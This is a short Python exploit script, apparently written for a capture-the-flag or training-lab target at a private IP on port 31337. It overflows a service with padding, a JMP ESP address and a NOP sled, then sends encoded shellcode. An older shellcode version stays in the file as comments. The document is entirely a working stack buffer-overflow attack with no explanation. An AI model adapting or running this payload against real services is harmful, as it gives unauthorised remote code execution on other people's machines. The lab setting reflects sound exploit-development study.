#!/usr/bin/env python3

import socket

host, port = "10.10.180.247", 31337

jmp_esp = b"\xbf\x16\x04\x08"


payload = b"".join([
	b"A" * 146,
])

# buf =  (b"\xda\xc9\xba\x70\x6f\x20\xc4\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
# b"\x52\x31\x50\x17\x83\xe8\xfc\x03\x20\x7c\xc2\x31\x3c\x6a\x80"
# b"\xba\xbc\x6b\xe5\x33\x59\x5a\x25\x27\x2a\xcd\x95\x23\x7e\xe2"
# b"\x5e\x61\x6a\x71\x12\xae\x9d\x32\x99\x88\x90\xc3\xb2\xe9\xb3"
# b"\x47\xc9\x3d\x13\x79\x02\x30\x52\xbe\x7f\xb9\x06\x17\x0b\x6c"
# b"\xb6\x1c\x41\xad\x3d\x6e\x47\xb5\xa2\x27\x66\x94\x75\x33\x31"
# b"\x36\x74\x90\x49\x7f\x6e\xf5\x74\xc9\x05\xcd\x03\xc8\xcf\x1f"
# b"\xeb\x67\x2e\x90\x1e\x79\x77\x17\xc1\x0c\x81\x6b\x7c\x17\x56"
# b"\x11\x5a\x92\x4c\xb1\x29\x04\xa8\x43\xfd\xd3\x3b\x4f\x4a\x97"
# b"\x63\x4c\x4d\x74\x18\x68\xc6\x7b\xce\xf8\x9c\x5f\xca\xa1\x47"
# b"\xc1\x4b\x0c\x29\xfe\x8b\xef\x96\x5a\xc0\x02\xc2\xd6\x8b\x4a"
# b"\x27\xdb\x33\x8b\x2f\x6c\x40\xb9\xf0\xc6\xce\xf1\x79\xc1\x09"
# b"\xf5\x53\xb5\x85\x08\x5c\xc6\x8c\xce\x08\x96\xa6\xe7\x30\x7d"
# b"\x36\x07\xe5\xd2\x66\xa7\x56\x93\xd6\x07\x07\x7b\x3c\x88\x78"
# b"\x9b\x3f\x42\x11\x36\xba\x05\xde\x6f\xc5\xd2\xb6\x6d\xc5\xdd"
# b"\xfd\xfb\x23\xb7\x11\xaa\xfc\x20\x8b\xf7\x76\xd0\x54\x22\xf3"
# b"\xd2\xdf\xc1\x04\x9c\x17\xaf\x16\x49\xd8\xfa\x44\xdc\xe7\xd0"
# b"\xe0\x82\x7a\xbf\xf0\xcd\x66\x68\xa7\x9a\x59\x61\x2d\x37\xc3"
# b"\xdb\x53\xca\x95\x24\xd7\x11\x66\xaa\xd6\xd4\xd2\x88\xc8\x20"
# b"\xda\x94\xbc\xfc\x8d\x42\x6a\xbb\x67\x25\xc4\x15\xdb\xef\x80"
# b"\xe0\x17\x30\xd6\xec\x7d\xc6\x36\x5c\x28\x9f\x49\x51\xbc\x17"
# b"\x32\x8f\x5c\xd7\xe9\x0b\x7c\x3a\x3b\x66\x15\xe3\xae\xcb\x78"
# b"\x14\x05\x0f\x85\x97\xaf\xf0\x72\x87\xda\xf5\x3f\x0f\x37\x84"
# b"\x50\xfa\x37\x3b\x50\x2f")

buf =  b""
buf += b"\xba\xa0\x9b\x2b\x31\xdb\xd7\xd9\x74\x24\xf4\x5f\x33"
buf += b"\xc9\xb1\x59\x31\x57\x14\x03\x57\x14\x83\xef\xfc\x42"
buf += b"\x6e\xd7\xd9\x0d\x91\x28\x1a\x71\x1b\xcd\x2b\xa3\x7f"
buf += b"\x85\x1e\x73\x0b\xcb\x92\xf8\x59\xf8\xa5\x49\x17\x26"
buf += b"\x31\xc7\x80\x17\xba\x16\x11\xfb\x78\x39\xed\x06\xad"
buf += b"\x99\xcc\xc8\xa0\xd8\x09\x9f\xcf\x35\xc7\x77\xbb\x9b"
buf += b"\xf8\xfc\xf9\x27\xf8\xd2\x75\x17\x82\x57\x49\xe3\x3e"
buf += b"\x59\x9a\x5b\x34\x11\x02\xd0\x12\x82\x33\x35\x27\x0b"
buf += b"\x47\x85\x61\x07\x9c\x7e\x40\xe8\xdc\x56\x92\xd6\x73"
buf += b"\x97\x1a\xdb\x8a\xd0\x9d\x04\xf9\x2a\xde\xb9\xfa\xe9"
buf += b"\x9c\x65\x8e\xed\x07\xed\x28\xc9\xb6\x22\xae\x9a\xb5"
buf += b"\x8f\xa4\xc4\xd9\x0e\x68\x7f\xe5\x9b\x8f\xaf\x6f\xdf"
buf += b"\xab\x6b\x2b\xbb\xd2\x2a\x91\x6a\xea\x2c\x7d\xd2\x4e"
buf += b"\x27\x6c\x05\xee\xc8\x6e\x2a\xb2\x5e\xa2\xe7\x4d\x9e"
buf += b"\xac\x70\x3d\xac\x73\x2b\xa9\x9c\xfc\xf5\x2e\x95\xeb"
buf += b"\x05\xe0\x1d\x7b\xf8\x01\x5d\x55\x3f\x55\x0d\xcd\x96"
buf += b"\xd6\xc6\x0d\x16\x03\x72\x04\x80\xa6\x93\x3f\xe9\xdf"
buf += b"\x91\x3f\x08\x9b\x1c\xd9\x5a\x8b\x4e\x76\x1b\x7b\x2e"
buf += b"\x26\xf3\x91\xa1\x19\xe3\x99\x68\x32\x8e\x75\xc4\x6a"
buf += b"\x27\xef\x4d\xe0\xd6\xf0\x58\x8c\xd9\x7b\x68\x70\x97"
buf += b"\x8b\x19\x62\xc0\xeb\xe1\x7a\x11\x9e\xe1\x10\x15\x08"
buf += b"\xb6\x8c\x17\x6d\xf0\x12\xe7\x58\x83\x55\x17\x1d\xb5"
buf += b"\x2e\x2e\x8b\xf9\x58\x4f\x5b\xf9\x98\x19\x31\xf9\xf0"
buf += b"\xfd\x61\xaa\xe5\x01\xbc\xdf\xb5\x97\x3f\x89\x6a\x3f"
buf += b"\x28\x37\x54\x77\xf7\xc8\xb3\x0b\xf0\x36\x41\x24\x59"
buf += b"\x5e\xb9\x74\x59\x9e\xd3\x74\x09\xf6\x28\x5a\xa6\x36"
buf += b"\xd0\x71\xef\x5e\x5b\x14\x5d\xff\x5c\x3d\x03\xa1\x5d"
buf += b"\xb2\x98\x52\x27\xbb\x1f\x93\xd8\xd5\x7b\x94\xd8\xd9"
buf += b"\x7d\xa9\x0e\xe0\x0b\xec\x92\x57\x03\x5b\xb6\xfe\x8e"
buf += b"\xa3\xe4\x01\x9b"




with socket.socket() as s:
	s.connect((host, port))
	s.send(payload + jmp_esp + b"\x90" * 24 + buf + b"\r\n")